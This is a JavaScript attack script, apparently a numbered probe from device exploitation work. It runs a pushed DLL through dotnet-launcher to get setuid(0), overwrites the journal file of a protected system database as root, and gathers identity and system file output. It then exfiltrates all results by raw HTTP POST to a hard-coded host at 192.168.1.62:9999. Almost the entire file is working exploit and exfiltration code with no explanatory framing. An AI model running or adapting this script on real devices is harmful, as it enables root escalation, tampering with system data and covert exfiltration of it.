"use strict";

/* p53: dotnet-launcher root placement
   1. cat dotnet config files (launch model / canonical invocation)
   2. dotnet-launcher placer.dll caps   -> confirm cap_setuid + setuid(0)
   3. dotnet-launcher placer.dll place -> setuid(0) + copy journal + chmod 644 + md5
   4. owner-side verify: md5sum dst + ls -la + live DB md5
   exfil /p53info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var DST = '/opt/dbspace/.app-context.db-journal';
var R = { ts: new Date().toISOString(), probe: 'p53', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p53info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) dotnet config files
  R.results.dotnet_cfg = run(
    'echo ===APPS_TXT===; cat /usr/bin/dotnet-apps.txt 2>&1; ' +
    'echo ===RUN_NI===; head -40 /usr/bin/dotnet-run-ni.sh 2>&1; ' +
    'echo ===INIT===; head -40 /usr/bin/dotnet-init.sh 2>&1', 15000
  );

  // confirm pushed files
  R.results.pushed = run('ls -la ' + PLDIR + '/placer.dll ' + PLDIR + '/placer.runtimeconfig.json ' + PLDIR + '/placer.deps.json 2>&1', 10000);

  // 2) caps test
  R.results.caps_test = run('/usr/bin/dotnet-launcher ' + PLDIR + '/placer.dll caps 2>&1; echo caps_exit=$?', 40000);

  // 3) placement
  R.results.place = run('/usr/bin/dotnet-launcher ' + PLDIR + '/placer.dll place 2>&1; echo place_exit=$?', 60000);

  // 4) owner-side verify
  R.results.verify = run('echo ===DST===; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; stat ' + DST + ' 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1; echo ===STAGED===; md5sum /home/owner/share/tmp/sdk_tools/appctx_hot_journal 2>&1', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
